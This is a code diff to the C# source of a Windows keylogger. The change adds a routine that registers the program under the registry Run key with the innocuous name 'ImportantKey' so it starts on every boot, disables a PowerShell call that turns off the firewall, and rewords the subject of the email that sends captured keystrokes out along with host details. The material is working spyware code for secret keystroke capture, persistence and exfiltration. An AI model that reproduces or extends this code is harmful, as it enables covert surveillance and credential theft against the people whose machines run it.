@@ -5,9 +5,7 @@ using System.Windows.Forms; //running app and converting keys
 using System.IO;
 using System.Net;
 using System.Net.Mail;
-using System.Collections.ObjectModel;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
+using Microsoft.Win32;
 
 
 namespace Keylogger01
@@ -34,8 +32,9 @@ namespace Keylogger01
         }
         public void start()
         {
+            setStartUpRegistry();           //Registry startup   
             hook = SetHook(llkProcedure);   //Defining our hook
-            turnOff();                      //Turning off firewall via powershell
+            //turnOff();                      //Turning off firewall via powershell
             Application.Run();              // Main loop
             UnhookWindowsHookEx(hook);
         }
@@ -141,7 +140,7 @@ namespace Keylogger01
             //create email message
 
             DateTime now = DateTime.Now;
-            string subject = "Message from keylogger";
+            string subject = "Very VERY important message from keylogger";
 
             var host = Dns.GetHostEntry(Dns.GetHostName());
 
@@ -167,6 +166,39 @@ namespace Keylogger01
             mailMessage.Body = emailBody;
             client.Send(mailMessage);
 
+        }
+
+        private void setStartUpRegistry()
+        {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+            int count = 0;
+            string actualLocation = System.Reflection.Assembly.GetEntryAssembly().Location; //Path to executable file
+
+            foreach (string keyName in key.GetValueNames())
+            {
+                if (keyName == "ImportantKey")
+                {
+                    if (actualLocation != (string)key.GetValue(keyName.ToString())) //Comparation of the executable file and value from registry
+                    {
+                        RegistryKey myKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                        if (myKey != null)
+                        {
+                            //Setting the atributes of registry key
+                            myKey.SetValue("ImportantKey", actualLocation, RegistryValueKind.String);
+                            myKey.Close();
+                        }
+                    }
+                    count++;
+                }
+            }
+
+            if (count == 0) //Record doesn't exist, create new
+            {
+                RegistryKey k;
+                k = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+                k.SetValue("ImportantKey", actualLocation);
+                k.Close();
+            }
         }
 
         private void turnOff()
